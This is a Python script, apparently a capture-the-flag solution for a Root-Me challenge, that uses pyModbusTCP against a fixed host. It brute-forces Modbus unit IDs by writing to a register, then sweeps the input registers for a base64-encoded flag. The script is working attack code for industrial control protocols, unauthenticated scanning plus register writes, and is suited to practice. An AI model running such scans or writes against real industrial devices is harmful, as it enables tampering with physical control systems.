from pyModbusTCP.client import ModbusClient
from base64 import b64decode

def scan():
    for unitid in range(1, 256):
        c = ModbusClient(host="163.172.68.42", port=10016, unit_id=unitid, auto_open=True)
        res = c.write_single_register(0x10, 0xff)
        c.close()
        if res != False:
            print('Found', unitid)
            break
    return unitid

def read(unitid):
    for addr in range(0, 65535):
        c = ModbusClient(host="163.172.68.42", port=10016, unit_id=unitid, auto_open=True)
        res = c.write_single_register(0x10, 0xff)
        if res == False:
            print('Write error')
            break
        else:
            res = c.read_input_registers(addr, 125)
            c.close()
            if res != [0]*125:
                info = ''.join([chr(i) for i in res])
                dec = b64decode(info).decode()
                if 'RM{' in dec:
                    return addr, dec

print('[+] Scan unit_d...')
unitid = scan()
print('[+] Scan unit_id: found', unitid)
print('[+] Scan input registers...')
addr, info = read(unitid)
print('[+] Scan input registers:', info, 'at address', addr)
